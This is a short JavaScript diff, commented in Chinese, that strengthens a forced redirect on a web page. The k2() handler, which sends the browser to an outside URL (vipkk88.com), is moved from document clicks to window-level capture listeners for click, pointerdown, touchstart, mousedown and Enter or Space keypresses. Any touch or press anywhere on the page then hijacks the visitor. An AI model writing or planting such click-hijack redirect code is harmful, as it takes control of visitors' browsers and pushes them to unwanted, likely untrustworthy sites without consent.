@@ -16,12 +16,17 @@
     __jumped = true;
     window.location.href = 'https://vipkk88.com/UIUK2P';
   }
-  /* 全页任意位置点击，都走同一个跳转事件 */
-  document.addEventListener('click', function () {
-    k2();
-  }, true);
+
+  /* 关键：绑到 window + 捕获阶段 + 覆盖多种事件类型
+     这样点击页面任意位置（包括空白、触摸、鼠标按下）都能跳转 */
+  ['click', 'pointerdown', 'touchstart', 'mousedown'].forEach(function (type) {
+    window.addEventListener(type, function () {
+      k2();
+    }, true);
+  });
+
   /* 键盘回车/空格等激活元素时同样触发 */
-  document.addEventListener('keydown', function (e) {
+  window.addEventListener('keydown', function (e) {
     if (e.key === 'Enter' || e.key === ' ' || e.key === 'Spacebar') {
       k2();
     }
